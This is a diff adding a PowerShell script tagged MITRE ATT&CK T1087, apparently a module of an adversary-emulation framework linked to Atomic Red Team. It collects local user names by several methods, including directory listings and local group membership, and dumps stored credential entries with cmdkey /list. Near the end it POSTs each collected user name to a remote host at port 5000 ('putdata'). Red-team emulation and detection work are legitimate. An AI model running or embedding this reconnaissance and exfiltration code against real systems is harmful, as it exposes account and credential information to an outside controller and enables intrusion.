@@ -1,0 +1,165 @@
+#Title: invoke-getUsers
+#Technique: T1087
+#Tactic: TA0007
+
+function invoke-getUsers
+    {
+    <#
+    .SYNOPSIS
+    get all users with differents commands
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation is not Required (e.g. root or admin)
+
+    .LINK
+    https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md
+    #>
+    $good = $false
+    $results = $null
+    #Put the output of net user into a variable.
+    #PowerShell automatically sets this as an array since
+    #the output is multi-lined.
+    $UserList= @()
+    $NetUser = (net user)
+    $results += $NetUser | Out-String
+    #Count how many lines are output by net user.
+    $LineCount = ($NetUser | Measure).Count
+    #Discount the last 3 lines of net user,
+    #since they're just noise.
+    $Count = $LineCount-3
+    #Cycle through all of the lines of $NetUser.
+      do {
+        #Split the current line of $NetUser on the space
+        #character into a separate array
+        $LineList = $NetUser[$Count].split(' ')
+        Write-Host("line: "+ $LineList)
+        #Remove all of the blank items from the new array.  
+        $UserList += $LineList -ne ""
+        #Increment the count.
+        $Count -= 1
+      }
+      #Exclude the first four lines (the count starts with
+      #zero), because they are also noise.
+      while ($Count -gt 3)
+      $UserList
+      $usuarios = Get-LocalUser  | ForEach-Object  Name
+      $results += $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            #añadiriamos el usuario
+            Write-Host("the user does not exist" +  $usuarios[$counter])
+            Write-Host("Adding...")  
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = ls C:/Users  | ForEach-Object  Name
+      $results += $usuarios | Out-String
+ 
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            #añadiriamos el usuario
+            Write-Host("the user does not exist:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = get-childitem C:\Users\ | ForEach-Object  Name
+ 
+      $results += $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            #añadiriamos el usuario
+            Write-Host("No existe el usuario:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+ 
+      $usuarios = dir C:\Users\ | ForEach-Object  Name  
+ 
+      $results += $usuarios | Out-String
+      for ($counter = 0; $counter -lt $usuarios.Count;$counter++)
+        {
+        If (-not ($UserList -contains $usuarios[$counter]))
+            {
+            #añadiriamos el usuario
+            Write-Host("the user does not exist:" +  $usuarios[$counter])
+            Write-Host("Adding...")
+            $UserList += $usuarios[$counter]
+            }
+        }
+
+   
+      $groups = get-localgroup | ForEach-Object  Name  
+      $results += $groups | Out-String
+      for ($counter = 0; $counter -lt $groups.Count;$counter++)
+        {    
+        $usuarios = net localgroup $groups[$counter] | ForEach-Object  Name
+   
+          for ($i = 0; $i -lt $usuarios.Count;$i++)
+            {    
+            $usuario = ($usuarios[$i]| out-string).split(' ')
+            $usuario = $usuario.Trim()
+            if ($usuario -ne "")
+                {
+           
+                If (-not ($UserList -contains $usuario))
+                    {
+                    #añadiriamos el usuario
+               
+                    Write-Host("the user does not exist:" +  $usuario)
+                    Write-Host("Adding...")
+                    $UserList += $usuario
+                    }
+                }
+            }
+        }
+
+    $listado = cmdkey.exe /list  
+    if( -not $UserList -eq "")
+        {
+        $good = $True
+        }
+
+    $results += $listado  | Out-String
+
+    return @{results=$results;success=$good;data=@{user=$UserList}}
+    }
+
+
+
+#Main program
+$execute = {
+  
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-getUsers
+
+#PutData if needed
+if($execute.success)
+{ 
+$uri = "http://"+$global:remoteip+":5000/putdata"
+for ($counter=0; $counter -lt $execute.data.user.count; $counter++)
+  {
+  $resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;user=$execute.data.user[$counter] | Out-String} $uri
+  }
+
+
+
+
+
+}
+return @{results=$execute.results;success=$execute.success}
